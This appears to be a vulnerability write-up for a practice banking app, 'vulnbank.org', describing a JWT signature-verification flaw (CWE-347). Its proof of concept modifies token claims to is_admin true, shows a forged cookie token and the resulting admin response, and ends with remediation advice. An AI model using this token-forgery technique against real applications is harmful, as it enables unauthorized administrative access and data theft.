# 🔓 Improper Verification of JWT Signature (Privilege Escalation)

## 📌 Summary

| Field        | Value                                                      |
| ------------ | ---------------------------------------------------------- |
| **Target**   | `vulnbank.org`                                             |
| **Endpoint** | `GET /dashboard`                                           |
| **Category** | Authentication / Authorization                             |
| **CWE**      | CWE-347 – Improper Verification of Cryptographic Signature |
| **Impact**   | Privilege Escalation                                       |
| **Severity** | Critical                                                   |

---

## 📖 Overview

The application uses JSON Web Token (JWT) for authentication and authorization. However, the server fails to properly verify the JWT signature before trusting the claims contained within the token.

Because authorization decisions rely directly on user-controlled JWT claims such as `user_id` and `is_admin`, an authenticated low-privileged user can modify the token payload to obtain administrative privileges.

---

## 🎯 Impact

A successful attacker can impersonate an administrator and gain access to privileged functionality that should only be available to authorized users.

Potential impacts include:

- Escalation from a standard user to an administrator
- Unauthorized access to administrative dashboards
- Disclosure of sensitive application data
- Unauthorized modification of privileged resources
- Complete compromise of administrative functionality

---

## 🧠 Root Cause

The application trusts authorization-related claims contained in the JWT without properly validating the cryptographic signature.

As a result, attackers can forge or modify JWT payloads while the server continues to treat the manipulated token as legitimate.

---

## ⚠️ Preconditions

The attacker only requires:

- A valid low-privileged account
- Access to intercept or modify HTTP requests (e.g., Burp Suite)

No administrator credentials are required.

---

# 🛠️ Proof of Concept

## Step 1 — Login

Authenticate using a normal user account.

---

## Step 2 — Capture the Request

Intercept the request to `/dashboard` using Burp Suite.

---

## Step 3 — Extract the JWT

Locate the JWT stored inside the `token` cookie.

Example:

```text
token= eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6InVzZXJAZ21haWwuY29tIiwiaXNfYWRtaW4iOmZhbHNlLCJpYXQiOjE3ODU4Mjc1NDR9.Brxnnz5tXtOTEgJuKRy8x5z7rAqNvbxm1pLwfU1q3Mg
```

---

## Step 4 — Modify the Payload

### Original Payload

```json
{
  "user_id": 5,
  "username": "user@gmail.com",
  "is_admin": false
}
```

↓

### Modified Payload

```json
{
  "user_id": 1,
  "username": "admin",
  "is_admin": true
}
```

Re-encode the JWT and replace the original token.

---

## Step 5 — Send the Request

Forward the modified request.

The server accepts the manipulated JWT and grants administrator privileges.

---

## HTTP Request

```http
GET /dashboard HTTP/1.1
Host: 127.0.0.1
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/login
Accept-Encoding: gzip, deflate, br
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6InVzZXJAZ21haWwuY29tIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTc4NTgyNzU0NH0.9V5pcvDwGqmt6A-RHkhZxIcZJgpF_yioBfUgpWk6Q20
Connection: keep-alive
```

---

## HTTP Response

```http
HTTP/1.1 200 OK

...

<div class="nav-section-label">Admin</div>

<a href="/sup3r_s3cr3t_admin">
    Admin Panel
</a>

...

<div class="sidebar-user-name">
    admin
</div>

...

<div id="account-number">
    ADMIN001
</div>

<div class="account-card-balance">
    $1000000.0
</div>

...
```

The response contains administrator-only content, including:

- Admin Panel navigation
- Administrator account information
- Administrative account balance

---

# ✅ Evidence

The manipulated JWT results in the following observable changes:

| Evidence         | Result       |
| ---------------- | ------------ |
| Sidebar Username | `admin`      |
| Admin Navigation | Visible      |
| Account Number   | `ADMIN001`   |
| Balance          | `$1000000.0` |

These changes confirm that the server authorizes the user based solely on the modified JWT claims.

---

# 📊 Attack Flow

```text
Normal User
      │
      ▼
Login
      │
      ▼
Receive JWT
      │
      ▼
Modify JWT Payload
(is_admin=true)
(user_id=1)
      │
      ▼
Send Modified JWT
      │
      ▼
Server Accepts Token
      │
      ▼
Administrator Access
```

---

# 🛡️ Remediation

To mitigate this vulnerability:

- Verify the JWT signature before processing any claims.
- Reject tokens with invalid signatures.
- Validate standard JWT claims such as `exp`, `iss`, `aud`, and `nbf`.
- Never rely solely on client-controlled claims for authorization decisions.
- Perform authorization checks using trusted server-side data.
- Rotate signing keys when compromise is suspected.

---

# 📚 References

- CWE-347 — Improper Verification of Cryptographic Signature
- OWASP JWT Cheat Sheet
- OWASP Top 10 (Broken Access Control)
- RFC 7519 — JSON Web Token (JWT)

---

# 📝 Conclusion

The application improperly validates JWT signatures, allowing an authenticated attacker to manipulate authorization-related claims and escalate privileges to an administrator.

Since authorization decisions are based on attacker-controlled token data, this issue represents a **Critical** authentication and authorization vulnerability that can lead to complete administrative compromise.
